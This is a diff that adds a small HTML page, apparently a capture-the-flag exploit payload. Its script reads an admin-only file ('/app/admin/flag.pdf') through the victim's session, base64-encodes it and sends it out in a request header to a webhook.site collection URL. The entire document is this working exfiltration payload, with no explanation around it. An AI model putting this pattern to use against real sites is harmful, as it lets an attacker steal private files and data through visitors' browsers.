@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch('/?document=/app/admin/flag.pdf')
+        .then(res => res.arrayBuffer())
+        .then(buf => {
+          const base64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
+          fetch('https://webhook.site/ff43b611-fde9-4a0f-b4e0-59799817a625', {
+            method: 'POST',
+            headers: {
+              'Flag': base64
+            }
+          });
+        });
+    </script>
+  </body>
+</html>
